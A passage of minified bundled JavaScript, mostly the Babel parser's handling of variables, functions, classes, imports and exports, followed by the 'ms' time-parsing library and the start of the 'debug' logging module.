X.left=J,X.right=Y?this.parseExpression():this.parseMaybeAssignAllowIn(),this.expect(11),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.scope.exit(),this.state.labels.pop(),this.finishNode(X,Y?"ForInStatement":"ForOfStatement")}parseVar(X,J,Q,Y=!1){let W=X.declarations=[];X.kind=Q;for(;;){let G=this.startNode();if(this.parseVarId(G,Q),G.init=!this.eat(29)?null:J?this.parseMaybeAssignDisallowIn():this.parseMaybeAssignAllowIn(),G.init===null&&!Y){if(G.id.type!=="Identifier"&&!(J&&(this.match(58)||this.isContextual(102))))this.raise(S.DeclarationMissingInitializer,this.state.lastTokEndLoc,{kind:"destructuring"});else if((Q==="const"||Q==="using"||Q==="await using")&&!(this.match(58)||this.isContextual(102)))this.raise(S.DeclarationMissingInitializer,this.state.lastTokEndLoc,{kind:Q})}if(W.push(this.finishNode(G,"VariableDeclarator")),!this.eat(12))break}return X}parseVarId(X,J){let Q=this.parseBindingAtom();if(J==="using"||J==="await using"){if(Q.type==="ArrayPattern"||Q.type==="ObjectPattern")this.raise(S.UsingDeclarationHasBindingPattern,Q.loc.start)}else if(Q.type==="VoidPattern")this.raise(S.UnexpectedVoidPattern,Q.loc.start);this.checkLVal(Q,{type:"VariableDeclarator"},J==="var"?5:8201),X.id=Q}parseAsyncFunctionExpression(X){return this.parseFunction(X,8)}parseFunction(X,J=0){let Q=J&2,Y=!!(J&1),W=Y&&!(J&4),G=!!(J&8);if(this.initFunction(X,G),this.match(55)){if(Q)this.raise(S.GeneratorInSingleStatementContext,this.state.startLoc);this.next(),X.generator=!0}if(Y)X.id=this.parseFunctionId(W);let H=this.state.maybeInArrowParameters;if(this.state.maybeInArrowParameters=!1,this.scope.enter(514),this.prodParam.enter(v5(G,X.generator)),!Y)X.id=this.parseFunctionId();if(this.parseFunctionParams(X,!1),this.withSmartMixTopicForbiddingContext(()=>{this.parseFunctionBodyAndFinish(X,Y?"FunctionDeclaration":"FunctionExpression")}),this.prodParam.exit(),this.scope.exit(),Y&&!Q)this.registerFunctionStatementId(X);return this.state.maybeInArrowParameters=H,X}parseFunctionId(X){return X||W0(this.state.type)?this.parseIdentifier():null}parseFunctionParams(X,J){this.expect(10),this.expressionScope.enter(zS()),X.params=this.parseBindingList(11,41,2|(J?4:0)),this.expressionScope.exit()}registerFunctionStatementId(X){if(!X.id)return;this.scope.declareName(X.id.name,!this.options.annexB||this.state.strict||X.generator||X.async?this.scope.treatFunctionsAsVar?5:8201:17,X.id.loc.start)}parseClass(X,J,Q){this.next();let Y=this.state.strict;return this.state.strict=!0,this.parseClassId(X,J,Q),this.parseClassSuper(X),X.body=this.parseClassBody(!!X.superClass,Y),this.finishNode(X,J?"ClassDeclaration":"ClassExpression")}isClassProperty(){return this.match(29)||this.match(13)||this.match(8)}isClassMethod(){return this.match(10)}nameIsConstructor(X){return X.type==="Identifier"&&X.name==="constructor"||X.type==="StringLiteral"&&X.value==="constructor"}isNonstaticConstructor(X){return!X.computed&&!X.static&&this.nameIsConstructor(X.key)}parseClassBody(X,J){this.classScope.enter();let Q={hadConstructor:!1,hadSuperClass:X},Y=[],W=this.startNode();if(W.body=[],this.expect(5),this.withSmartMixTopicForbiddingContext(()=>{while(!this.match(8)){if(this.eat(13)){if(Y.length>0)throw this.raise(S.DecoratorSemicolon,this.state.lastTokEndLoc);continue}if(this.match(26)){Y.push(this.parseDecorator());continue}let G=this.startNode();if(Y.length)G.decorators=Y,this.resetStartLocationFromNode(G,Y[0]),Y=[];if(this.parseClassMember(W,G,Q),G.kind==="constructor"&&G.decorators&&G.decorators.length>0)this.raise(S.DecoratorConstructor,G)}}),this.state.strict=J,this.next(),Y.length)throw this.raise(S.TrailingDecorator,this.state.startLoc);return this.classScope.exit(),this.finishNode(W,"ClassBody")}parseClassMemberFromModifier(X,J){let Q=this.parseIdentifier(!0);if(this.isClassMethod()){let Y=J;return Y.kind="method",Y.computed=!1,Y.key=Q,Y.static=!1,this.pushClassMethod(X,Y,!1,!1,!1,!1),!0}else if(this.isClassProperty()){let Y=J;return Y.computed=!1,Y.key=Q,Y.static=!1,X.body.push(this.parseClassProperty(Y)),!0}return this.resetPreviousNodeTrailingComments(Q),!1}parseClassMember(X,J,Q){let Y=this.isContextual(106);if(Y){if(this.parseClassMemberFromModifier(X,J))return;if(this.eat(5)){this.parseClassStaticBlock(X,J);return}}this.parseClassMemberWithIsStatic(X,J,Q,Y)}parseClassMemberWithIsStatic(X,J,Q,Y){let W=J,G=J,H=J,z=J,$=J,V=W,K=W;if(J.static=Y,this.parsePropertyNamePrefixOperator(J),this.eat(55)){V.kind="method";let R=this.match(139);if(this.parseClassElementName(V),this.parsePostMemberNameModifiers(V),R){this.pushClassPrivateMethod(X,G,!0,!1);return}if(this.isNonstaticConstructor(W))this.raise(S.ConstructorIsGenerator,W.key);this.pushClassMethod(X,W,!0,!1,!1,!1);return}let Z=!this.state.containsEsc&&W0(this.state.type),q=this.parseClassElementName(J),B=Z?q.name:null,M=this.isPrivateName(q),O=this.state.startLoc;if(this.parsePostMemberNameModifiers(K),this.isClassMethod()){if(V.kind="method",M){this.pushClassPrivateMethod(X,G,!1,!1);return}let R=this.isNonstaticConstructor(W),I=!1;if(R){if(W.kind="constructor",Q.hadConstructor&&!this.hasPlugin("typescript"))this.raise(S.DuplicateConstructor,q);if(R&&this.hasPlugin("typescript")&&J.override)this.raise(S.OverrideOnConstructor,q);Q.hadConstructor=!0,I=Q.hadSuperClass}this.pushClassMethod(X,W,!1,!1,R,I)}else if(this.isClassProperty())if(M)this.pushClassPrivateProperty(X,z);else this.pushClassProperty(X,H);else if(B==="async"&&!this.isLineTerminator()){this.resetPreviousNodeTrailingComments(q);let R=this.eat(55);if(K.optional)this.unexpected(O);V.kind="method";let I=this.match(139);if(this.parseClassElementName(V),this.parsePostMemberNameModifiers(K),I)this.pushClassPrivateMethod(X,G,R,!0);else{if(this.isNonstaticConstructor(W))this.raise(S.ConstructorIsAsync,W.key);this.pushClassMethod(X,W,R,!0,!1,!1)}}else if((B==="get"||B==="set")&&!(this.match(55)&&this.isLineTerminator())){this.resetPreviousNodeTrailingComments(q),V.kind=B;let R=this.match(139);if(this.parseClassElementName(W),R)this.pushClassPrivateMethod(X,G,!1,!1);else{if(this.isNonstaticConstructor(W))this.raise(S.ConstructorIsAccessor,W.key);this.pushClassMethod(X,W,!1,!1,!1,!1)}this.checkGetterSetterParams(W)}else if(B==="accessor"&&!this.isLineTerminator()){this.expectPlugin("decoratorAutoAccessors"),this.resetPreviousNodeTrailingComments(q);let R=this.match(139);this.parseClassElementName(H),this.pushClassAccessorProperty(X,$,R)}else if(this.isLineTerminator())if(M)this.pushClassPrivateProperty(X,z);else this.pushClassProperty(X,H);else this.unexpected()}parseClassElementName(X){let{type:J,value:Q}=this.state;if((J===132||J===134)&&X.static&&Q==="prototype")this.raise(S.StaticPrototype,this.state.startLoc);if(J===139){if(Q==="constructor")this.raise(S.ConstructorClassPrivateField,this.state.startLoc);let Y=this.parsePrivateName();return X.key=Y,Y}return this.parsePropertyName(X),X.key}parseClassStaticBlock(X,J){var Q;this.scope.enter(720);let Y=this.state.labels;this.state.labels=[],this.prodParam.enter(0);let W=J.body=[];if(this.parseBlockOrModuleBlockBody(W,void 0,!1,8),this.prodParam.exit(),this.scope.exit(),this.state.labels=Y,X.body.push(this.finishNode(J,"StaticBlock")),(Q=J.decorators)!=null&&Q.length)this.raise(S.DecoratorStaticBlock,J)}pushClassProperty(X,J){if(!J.computed&&this.nameIsConstructor(J.key))this.raise(S.ConstructorClassField,J.key);X.body.push(this.parseClassProperty(J))}pushClassPrivateProperty(X,J){let Q=this.parseClassPrivateProperty(J);X.body.push(Q),this.classScope.declarePrivateName(this.getPrivateNameSV(Q.key),0,Q.key.loc.start)}pushClassAccessorProperty(X,J,Q){if(!Q&&!J.computed&&this.nameIsConstructor(J.key))this.raise(S.ConstructorClassField,J.key);let Y=this.parseClassAccessorProperty(J);if(X.body.push(Y),Q)this.classScope.declarePrivateName(this.getPrivateNameSV(Y.key),0,Y.key.loc.start)}pushClassMethod(X,J,Q,Y,W,G){X.body.push(this.parseMethod(J,Q,Y,W,G,"ClassMethod",!0))}pushClassPrivateMethod(X,J,Q,Y){let W=this.parseMethod(J,Q,Y,!1,!1,"ClassPrivateMethod",!0);X.body.push(W);let G=W.kind==="get"?W.static?6:2:W.kind==="set"?W.static?5:1:0;this.declareClassPrivateMethodInScope(W,G)}declareClassPrivateMethodInScope(X,J){this.classScope.declarePrivateName(this.getPrivateNameSV(X.key),J,X.key.loc.start)}parsePostMemberNameModifiers(X){}parseClassPrivateProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassPrivateProperty")}parseClassProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassProperty")}parseClassAccessorProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassAccessorProperty")}parseInitializer(X){this.scope.enter(592),this.expressionScope.enter(HV()),this.prodParam.enter(0),X.value=this.eat(29)?this.parseMaybeAssignAllowIn():null,this.expressionScope.exit(),this.prodParam.exit(),this.scope.exit()}parseClassId(X,J,Q,Y=8331){if(W0(this.state.type)){if(X.id=this.parseIdentifier(),J)this.declareNameFromIdentifier(X.id,Y)}else if(Q||!J)X.id=null;else throw this.raise(S.MissingClassName,this.state.startLoc)}parseClassSuper(X){X.superClass=this.eat(81)?this.parseExprSubscripts():null}parseExport(X,J){let Q=this.parseMaybeImportPhase(X,!0),Y=this.maybeParseExportDefaultSpecifier(X,Q),W=!Y||this.eat(12),G=W&&this.eatExportStar(X),H=G&&this.maybeParseExportNamespaceSpecifier(X),z=W&&(!H||this.eat(12)),$=Y||G;if(G&&!H){if(Y)this.unexpected();if(J)throw this.raise(S.UnsupportedDecoratorExport,X);return this.parseExportFrom(X,!0),this.sawUnambiguousESM=!0,this.finishNode(X,"ExportAllDeclaration")}let V=this.maybeParseExportNamedSpecifiers(X);if(Y&&W&&!G&&!V)this.unexpected(null,5);if(H&&z)this.unexpected(null,98);let K;if($||V){if(K=!1,J)throw this.raise(S.UnsupportedDecoratorExport,X);this.parseExportFrom(X,$)}else K=this.maybeParseExportDeclaration(X);if($||V||K){var Z;let q=X;if(this.checkExport(q,!0,!1,!!q.source),((Z=q.declaration)==null?void 0:Z.type)==="ClassDeclaration")this.maybeTakeDecorators(J,q.declaration,q);else if(J)throw this.raise(S.UnsupportedDecoratorExport,X);return this.sawUnambiguousESM=!0,this.finishNode(q,"ExportNamedDeclaration")}if(this.eat(65)){let q=X,B=this.parseExportDefaultExpression();if(q.declaration=B,B.type==="ClassDeclaration")this.maybeTakeDecorators(J,B,q);else if(J)throw this.raise(S.UnsupportedDecoratorExport,X);return this.checkExport(q,!0,!0),this.sawUnambiguousESM=!0,this.finishNode(q,"ExportDefaultDeclaration")}this.unexpected(null,5)}eatExportStar(X){return this.eat(55)}maybeParseExportDefaultSpecifier(X,J){if(J||this.isExportDefaultSpecifier()){this.expectPlugin("exportDefaultFrom",J==null?void 0:J.loc.start);let Q=J||this.parseIdentifier(!0),Y=this.startNodeAtNode(Q);return Y.exported=Q,X.specifiers=[this.finishNode(Y,"ExportDefaultSpecifier")],!0}return!1}maybeParseExportNamespaceSpecifier(X){if(this.isContextual(93)){var J,Q;(Q=(J=X).specifiers)!=null||(J.specifiers=[]);let Y=this.startNodeAt(this.state.lastTokStartLoc);return this.next(),Y.exported=this.parseModuleExportName(),X.specifiers.push(this.finishNode(Y,"ExportNamespaceSpecifier")),!0}return!1}maybeParseExportNamedSpecifiers(X){if(this.match(5)){let J=X;if(!J.specifiers)J.specifiers=[];let Q=J.exportKind==="type";if(J.specifiers.push(...this.parseExportSpecifiers(Q)),J.source=null,this.hasPlugin("importAssertions"))J.assertions=[];else J.attributes=[];return J.declaration=null,!0}return!1}maybeParseExportDeclaration(X){if(this.shouldParseExportDeclaration()){if(X.specifiers=[],X.source=null,this.hasPlugin("importAssertions"))X.assertions=[];else X.attributes=[];return X.declaration=this.parseExportDeclaration(X),!0}return!1}isAsyncFunction(){if(!this.isContextual(95))return!1;let X=this.nextTokenInLineStart();return this.isUnparsedContextual(X,"function")}parseExportDefaultExpression(){let X=this.startNode();if(this.match(68))return this.next(),this.parseFunction(X,5);else if(this.isAsyncFunction())return this.next(),this.next(),this.parseFunction(X,13);if(this.match(80))return this.parseClass(X,!0,!0);if(this.match(26)){if(this.hasPlugin("decorators")&&this.getPluginOption("decorators","decoratorsBeforeExport")===!0)this.raise(S.DecoratorBeforeExport,this.state.startLoc);return this.parseClass(this.maybeTakeDecorators(this.parseDecorators(!1),this.startNode()),!0,!0)}if(this.match(75)||this.match(74)||this.isLet()||this.isUsing()||this.isAwaitUsing())throw this.raise(S.UnsupportedDefaultExport,this.state.startLoc);let J=this.parseMaybeAssignAllowIn();return this.semicolon(),J}parseExportDeclaration(X){if(this.match(80))return this.parseClass(this.startNode(),!0,!1);return this.parseStatementListItem()}isExportDefaultSpecifier(){let{type:X}=this.state;if(W0(X)){if(X===95&&!this.state.containsEsc||X===100)return!1;if((X===130||X===129)&&!this.state.containsEsc){let Y=this.nextTokenStart(),W=this.input.charCodeAt(Y);if(W===123||this.chStartsBindingIdentifier(W,Y)&&!this.input.startsWith("from",Y))return this.expectOnePlugin(["flow","typescript"]),!1}}else if(!this.match(65))return!1;let J=this.nextTokenStart(),Q=this.isUnparsedContextual(J,"from");if(this.input.charCodeAt(J)===44||W0(this.state.type)&&Q)return!0;if(this.match(65)&&Q){let Y=this.input.charCodeAt(this.nextTokenStartSince(J+4));return Y===34||Y===39}return!1}parseExportFrom(X,J){if(this.eatContextual(98))X.source=this.parseImportSource(),this.checkExport(X),this.maybeParseImportAttributes(X),this.checkJSONModuleImport(X);else if(J)this.unexpected();this.semicolon()}shouldParseExportDeclaration(){let{type:X}=this.state;if(X===26){if(this.expectOnePlugin(["decorators","decorators-legacy"]),this.hasPlugin("decorators")){if(this.getPluginOption("decorators","decoratorsBeforeExport")===!0)this.raise(S.DecoratorBeforeExport,this.state.startLoc);return!0}}if(this.isUsing())return this.raise(S.UsingDeclarationExport,this.state.startLoc),!0;if(this.isAwaitUsing())return this.raise(S.UsingDeclarationExport,this.state.startLoc),!0;return X===74||X===75||X===68||X===80||this.isLet()||this.isAsyncFunction()}checkExport(X,J,Q,Y){if(J){var W;if(Q){if(this.checkDuplicateExports(X,"default"),this.hasPlugin("exportDefaultFrom")){var G;let H=X.declaration;if(H.type==="Identifier"&&H.name==="from"&&H.end-H.start===4&&!((G=H.extra)!=null&&G.parenthesized))this.raise(S.ExportDefaultFromAsIdentifier,H)}}else if((W=X.specifiers)!=null&&W.length)for(let H of X.specifiers){let{exported:z}=H,$=z.type==="Identifier"?z.name:z.value;if(this.checkDuplicateExports(H,$),!Y&&H.local){let{local:V}=H;if(V.type!=="Identifier")this.raise(S.ExportBindingIsString,H,{localName:V.value,exportName:$});else this.checkReservedWord(V.name,V.loc.start,!0,!1),this.scope.checkLocalExport(V)}}else if(X.declaration){let H=X.declaration;if(H.type==="FunctionDeclaration"||H.type==="ClassDeclaration"){let{id:z}=H;if(!z)throw Error("Assertion failure");this.checkDuplicateExports(X,z.name)}else if(H.type==="VariableDeclaration")for(let z of H.declarations)this.checkDeclaration(z.id)}}}checkDeclaration(X){if(X.type==="Identifier")this.checkDuplicateExports(X,X.name);else if(X.type==="ObjectPattern")for(let J of X.properties)this.checkDeclaration(J);else if(X.type==="ArrayPattern"){for(let J of X.elements)if(J)this.checkDeclaration(J)}else if(X.type==="ObjectProperty")this.checkDeclaration(X.value);else if(X.type==="RestElement")this.checkDeclaration(X.argument);else if(X.type==="AssignmentPattern")this.checkDeclaration(X.left)}checkDuplicateExports(X,J){if(this.exportedIdentifiers.has(J))if(J==="default")this.raise(S.DuplicateDefaultExport,X);else this.raise(S.DuplicateExport,X,{exportName:J});this.exportedIdentifiers.add(J)}parseExportSpecifiers(X){let J=[],Q=!0;this.expect(5);while(!this.eat(8)){if(Q)Q=!1;else if(this.expect(12),this.eat(8))break;let Y=this.isContextual(130),W=this.match(134),G=this.startNode();G.local=this.parseModuleExportName(),J.push(this.parseExportSpecifier(G,W,X,Y))}return J}parseExportSpecifier(X,J,Q,Y){if(this.eatContextual(93))X.exported=this.parseModuleExportName();else if(J)X.exported=this.cloneStringLiteral(X.local);else if(!X.exported)X.exported=this.cloneIdentifier(X.local);return this.finishNode(X,"ExportSpecifier")}parseModuleExportName(){if(this.match(134)){let X=this.parseStringLiteral(this.state.value),J=wS.exec(X.value);if(J)this.raise(S.ModuleExportNameHasLoneSurrogate,X,{surrogateCharCode:J[0].charCodeAt(0)});return X}return this.parseIdentifier(!0)}isJSONModuleImport(X){if(X.assertions!=null)return X.assertions.some(({key:J,value:Q})=>{return Q.value==="json"&&(J.type==="Identifier"?J.name==="type":J.value==="type")});return!1}checkImportReflection(X){let{specifiers:J}=X,Q=J.length===1?J[0].type:null;if(X.phase==="source"){if(Q!=="ImportDefaultSpecifier")this.raise(S.SourcePhaseImportRequiresDefault,J[0].loc.start)}else if(X.phase==="defer"){if(Q!=="ImportNamespaceSpecifier")this.raise(S.DeferImportRequiresNamespace,J[0].loc.start)}else if(X.module){var Y;if(Q!=="ImportDefaultSpecifier")this.raise(S.ImportReflectionNotBinding,J[0].loc.start);if(((Y=X.assertions)==null?void 0:Y.length)>0)this.raise(S.ImportReflectionHasAssertion,J[0].loc.start)}}checkJSONModuleImport(X){if(this.isJSONModuleImport(X)&&X.type!=="ExportAllDeclaration"){let{specifiers:J}=X;if(J!=null){let Q=J.find((Y)=>{let W;if(Y.type==="ExportSpecifier")W=Y.local;else if(Y.type==="ImportSpecifier")W=Y.imported;if(W!==void 0)return W.type==="Identifier"?W.name!=="default":W.value!=="default"});if(Q!==void 0)this.raise(S.ImportJSONBindingNotDefault,Q.loc.start)}}}isPotentialImportPhase(X){if(X)return!1;return this.isContextual(105)||this.isContextual(97)||this.isContextual(127)}applyImportPhase(X,J,Q,Y){if(J)return;if(Q==="module")this.expectPlugin("importReflection",Y),X.module=!0;else if(this.hasPlugin("importReflection"))X.module=!1;if(Q==="source")this.expectPlugin("sourcePhaseImports",Y),X.phase="source";else if(Q==="defer")this.expectPlugin("deferredImportEvaluation",Y),X.phase="defer";else if(this.hasPlugin("sourcePhaseImports"))X.phase=null}parseMaybeImportPhase(X,J){if(!this.isPotentialImportPhase(J))return this.applyImportPhase(X,J,null),null;let Q=this.startNode(),Y=this.parseIdentifierName(!0),{type:W}=this.state;if(u9(W)?W!==98||this.lookaheadCharCode()===102:W!==12)return this.applyImportPhase(X,J,Y,Q.loc.start),null;else return this.applyImportPhase(X,J,null),this.createIdentifier(Q,Y)}isPrecedingIdImportPhase(X){let{type:J}=this.state;return W0(J)?J!==98||this.lookaheadCharCode()===102:J!==12}parseImport(X){if(this.match(134))return this.parseImportSourceAndAttributes(X);return this.parseImportSpecifiersAndAfter(X,this.parseMaybeImportPhase(X,!1))}parseImportSpecifiersAndAfter(X,J){X.specifiers=[];let Y=!this.maybeParseDefaultImportSpecifier(X,J)||this.eat(12),W=Y&&this.maybeParseStarImportSpecifier(X);if(Y&&!W)this.parseNamedImportSpecifiers(X);return this.expectContextual(98),this.parseImportSourceAndAttributes(X)}parseImportSourceAndAttributes(X){var J;return(J=X.specifiers)!=null||(X.specifiers=[]),X.source=this.parseImportSource(),this.maybeParseImportAttributes(X),this.checkImportReflection(X),this.checkJSONModuleImport(X),this.semicolon(),this.sawUnambiguousESM=!0,this.finishNode(X,"ImportDeclaration")}parseImportSource(){if(!this.match(134))this.unexpected();return this.parseExprAtom()}parseImportSpecifierLocal(X,J,Q){J.local=this.parseIdentifier(),X.specifiers.push(this.finishImportSpecifier(J,Q))}finishImportSpecifier(X,J,Q=8201){return this.checkLVal(X.local,{type:J},Q),this.finishNode(X,J)}parseImportAttributes(){this.expect(5);let X=[],J=new Set;do{if(this.match(8))break;let Q=this.startNode(),Y=this.state.value;if(J.has(Y))this.raise(S.ModuleAttributesWithDuplicateKeys,this.state.startLoc,{key:Y});if(J.add(Y),this.match(134))Q.key=this.parseStringLiteral(Y);else Q.key=this.parseIdentifier(!0);if(this.expect(14),!this.match(134))throw this.raise(S.ModuleAttributeInvalidValue,this.state.startLoc);Q.value=this.parseStringLiteral(this.state.value),X.push(this.finishNode(Q,"ImportAttribute"))}while(this.eat(12));return this.expect(8),X}parseModuleAttributes(){let X=[],J=new Set;do{let Q=this.startNode();if(Q.key=this.parseIdentifier(!0),Q.key.name!=="type")this.raise(S.ModuleAttributeDifferentFromType,Q.key);if(J.has(Q.key.name))this.raise(S.ModuleAttributesWithDuplicateKeys,Q.key,{key:Q.key.name});if(J.add(Q.key.name),this.expect(14),!this.match(134))throw this.raise(S.ModuleAttributeInvalidValue,this.state.startLoc);Q.value=this.parseStringLiteral(this.state.value),X.push(this.finishNode(Q,"ImportAttribute"))}while(this.eat(12));return X}maybeParseImportAttributes(X){let J;var Q=!1;if(this.match(76)){if(this.hasPrecedingLineBreak()&&this.lookaheadCharCode()===40)return;if(this.next(),this.hasPlugin("moduleAttributes"))J=this.parseModuleAttributes(),this.addExtra(X,"deprecatedWithLegacySyntax",!0);else J=this.parseImportAttributes();Q=!0}else if(this.isContextual(94)&&!this.hasPrecedingLineBreak()){if(!this.hasPlugin("deprecatedImportAssert")&&!this.hasPlugin("importAssertions"))this.raise(S.ImportAttributesUseAssert,this.state.startLoc);if(!this.hasPlugin("importAssertions"))this.addExtra(X,"deprecatedAssertSyntax",!0);this.next(),J=this.parseImportAttributes()}else J=[];if(!Q&&this.hasPlugin("importAssertions"))X.assertions=J;else X.attributes=J}maybeParseDefaultImportSpecifier(X,J){if(J){let Q=this.startNodeAtNode(J);return Q.local=J,X.specifiers.push(this.finishImportSpecifier(Q,"ImportDefaultSpecifier")),!0}else if(u9(this.state.type))return this.parseImportSpecifierLocal(X,this.startNode(),"ImportDefaultSpecifier"),!0;return!1}maybeParseStarImportSpecifier(X){if(this.match(55)){let J=this.startNode();return this.next(),this.expectContextual(93),this.parseImportSpecifierLocal(X,J,"ImportNamespaceSpecifier"),!0}return!1}parseNamedImportSpecifiers(X){let J=!0;this.expect(5);while(!this.eat(8)){if(J)J=!1;else{if(this.eat(14))throw this.raise(S.DestructureNamedImport,this.state.startLoc);if(this.expect(12),this.eat(8))break}let Q=this.startNode(),Y=this.match(134),W=this.isContextual(130);Q.imported=this.parseModuleExportName();let G=this.parseImportSpecifier(Q,Y,X.importKind==="type"||X.importKind==="typeof",W,void 0);X.specifiers.push(G)}}parseImportSpecifier(X,J,Q,Y,W){if(this.eatContextual(93))X.local=this.parseIdentifier();else{let{imported:G}=X;if(J)throw this.raise(S.ImportBindingIsString,X,{importName:G.value});if(this.checkReservedWord(G.name,X.loc.start,!0,!0),!X.local)X.local=this.cloneIdentifier(G)}return this.finishImportSpecifier(X,"ImportSpecifier",W)}isThisParam(X){return X.type==="Identifier"&&X.name==="this"}}class u2 extends MV{constructor(X,J,Q){X=DP(X);super(X,J);this.options=X,this.initializeScopes(),this.plugins=Q,this.filename=X.sourceFilename,this.startIndex=X.startIndex;let Y=0;if(X.allowAwaitOutsideFunction)Y|=1;if(X.allowReturnOutsideFunction)Y|=2;if(X.allowImportExportEverywhere)Y|=8;if(X.allowSuperOutsideMethod)Y|=16;if(X.allowUndeclaredExports)Y|=64;if(X.allowNewTargetOutsideFunction)Y|=4;if(X.allowYieldOutsideFunction)Y|=32;if(X.ranges)Y|=128;if(X.tokens)Y|=256;if(X.createImportExpressions)Y|=512;if(X.createParenthesizedExpressions)Y|=1024;if(X.errorRecovery)Y|=2048;if(X.attachComment)Y|=4096;if(X.annexB)Y|=8192;this.optionFlags=Y}getScopeHandler(){return h5}parse(){this.enterInitialScopes();let X=this.startNode(),J=this.startNode();return this.nextToken(),X.errors=null,this.parseTopLevel(X,J),X.errors=this.state.errors,X.comments.length=this.state.commentsLen,X}}function LS(X,J){var Q;if(((Q=J)==null?void 0:Q.sourceType)==="unambiguous"){J=Object.assign({},J);try{J.sourceType="module";let Y=cJ(J,X),W=Y.parse();if(Y.sawUnambiguousESM)return W;if(Y.ambiguousScriptDifferentAst)try{return J.sourceType="script",cJ(J,X).parse()}catch(G){}else W.program.sourceType="script";return W}catch(Y){try{return J.sourceType="script",cJ(J,X).parse()}catch(W){}throw Y}}else return cJ(J,X).parse()}function IS(X,J){let Q=cJ(J,X);if(Q.options.strictMode)Q.state.strict=!0;return Q.getExpression()}function CS(X){let J={};for(let Q of Object.keys(X))J[Q]=P6(X[Q]);return J}var PS=CS(IP);function cJ(X,J){let Q=u2,Y=new Map;if(X!=null&&X.plugins){for(let W of X.plugins){let G,H;if(typeof W==="string")G=W;else[G,H]=W;if(!Y.has(G))Y.set(G,H||{})}RS(Y),Q=SS(Y)}return new Q(X,J,Y)}var y$=new Map;function SS(X){let J=[];for(let W of AS)if(X.has(W))J.push(W);let Q=J.join("|"),Y=y$.get(Q);if(!Y){Y=u2;for(let W of J)Y=qV[W](Y);y$.set(Q,Y)}return Y}jV.parse=LS;jV.parseExpression=IS;jV.tokTypes=PS});var c2=v((OV)=>{Object.defineProperty(OV,"__esModule",{value:!0});OV.Var=OV.User=OV.Statement=OV.SpreadProperty=OV.Scope=OV.RestProperty=OV.ReferencedMemberExpression=OV.ReferencedIdentifier=OV.Referenced=OV.Pure=OV.NumericLiteralTypeAnnotation=OV.Generated=OV.ForAwaitStatement=OV.Flow=OV.Expression=OV.ExistentialTypeParam=OV.BlockScoped=OV.BindingIdentifier=void 0;var xg1=OV.ReferencedIdentifier=["Identifier","JSXIdentifier"],hg1=OV.ReferencedMemberExpression=["MemberExpression"],yg1=OV.BindingIdentifier=["Identifier"],gg1=OV.Statement=["Statement"],mg1=OV.Expression=["Expression"],ug1=OV.Scope=["Scopable","Pattern"],cg1=OV.Referenced=null,lg1=OV.BlockScoped=null,pg1=OV.Var=["VariableDeclaration"],dg1=OV.User=null,ig1=OV.Generated=null,rg1=OV.Pure=null,ag1=OV.Flow=["Flow","ImportDeclaration","ExportDeclaration","ImportSpecifier"],ng1=OV.RestProperty=["RestElement"],sg1=OV.SpreadProperty=["RestElement"],og1=OV.ExistentialTypeParam=["ExistsTypeAnnotation"],tg1=OV.NumericLiteralTypeAnnotation=["NumberLiteralTypeAnnotation"],eg1=OV.ForAwaitStatement=["ForOfStatement"]});var AV=v((Jm1,RV)=>{var h8=1000,y8=h8*60,g8=y8*60,EX=g8*24,nS=EX*7,sS=EX*365.25;RV.exports=function(X,J){J=J||{};var Q=typeof X;if(Q==="string"&&X.length>0)return oS(X);else if(Q==="number"&&isFinite(X))return J.long?eS(X):tS(X);throw Error("val is not a non-empty string or a valid number. val="+JSON.stringify(X))};function oS(X){if(X=String(X),X.length>100)return;var J=/^(-?(?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|weeks?|w|years?|yrs?|y)?$/i.exec(X);if(!J)return;var Q=parseFloat(J[1]),Y=(J[2]||"ms").toLowerCase();switch(Y){case"years":case"year":case"yrs":case"yr":case"y":return Q*sS;case"weeks":case"week":case"w":return Q*nS;case"days":case"day":case"d":return Q*EX;case"hours":case"hour":case"hrs":case"hr":case"h":return Q*g8;case"minutes":case"minute":case"mins":case"min":case"m":return Q*y8;case"seconds":case"second":case"secs":case"sec":case"s":return Q*h8;case"milliseconds":case"millisecond":case"msecs":case"msec":case"ms":return Q;default:return}}function tS(X){var J=Math.abs(X);if(J>=EX)return Math.round(X/EX)+"d";if(J>=g8)return Math.round(X/g8)+"h";if(J>=y8)return Math.round(X/y8)+"m";if(J>=h8)return Math.round(X/h8)+"s";return X+"ms"}function eS(X){var J=Math.abs(X);if(J>=EX)return g5(X,J,EX,"day");if(J>=g8)return g5(X,J,g8,"hour");if(J>=y8)return g5(X,J,y8,"minute");if(J>=h8)return g5(X,J,h8,"second");return X+" ms"}function g5(X,J,Q,Y){var W=J>=Q*1.5;return Math.round(X/Q)+" "+Y+(W?"s":"")}});var l2=v((Qm1,DV)=>{function XT(X){Q.debug=Q,Q.default=Q,Q.coerce=$,Q.disable=H,Q.enable=W,Q.enabled=z,Q.humanize=AV(),Q.destroy=V,Object.keys(X).forEach((K)=>{Q[K]=X[K]}),Q.names=[],Q.skips=[],Q.formatters={};function J(K){let Z=0;for(let q=0;q<K.length;q++)Z=(Z<<5)-Z+K.charCodeAt(q),Z|=0;return Q.colors[Math.abs(Z)%Q.colors.length]}Q.selectColor=J;function Q(K){let Z,q=null,B,M;function O(...R){if(!O.enabled)return;let I=O,F=Number(new Date),T=F-(Z||F);if(I.diff=T,I.prev=Z,I.curr=F,Z=F,R[0]=Q.coerce(R[0]),typeof R[0]!=="string")R.unshift("%O");let b=0;R[0]=R[0].replace(/%([a-zA-Z%])/g,(L,N)=>{if(L==="%%")return"%";b++;let k=Q.formatters[N];if(typeof k==="function"){let _=R[b];L=k.call(I,_),R.splice(b,1),b--}return L}),Q.formatArgs.call(I,R),(I.log||Q.log).apply(I,R)}if(O.namespace=K,O.useColors=Q.useColors(),O.color=Q.selectColor(K),O.extend=Y,O.destroy=Q.destroy,Object.defineProperty(O,"enabled",{enumerable:!0,configurable:!1,get:()=>{if(q!==null)return q;if(B!==Q.namespaces)B=Q.namespaces,M=Q.enabled(K);return M},set:(R)=>{q=R}}),typeof Q.init==="function")Q.init(O);return O}function Y(K,Z){let q=Q(this.namespace+(typeof Z>"u"?":":Z)+K);return q.log=this.log,q}function W(K){Q.save(K),Q.namespaces=K,Q.names=[],Q.skips=[];let Z=(typeof 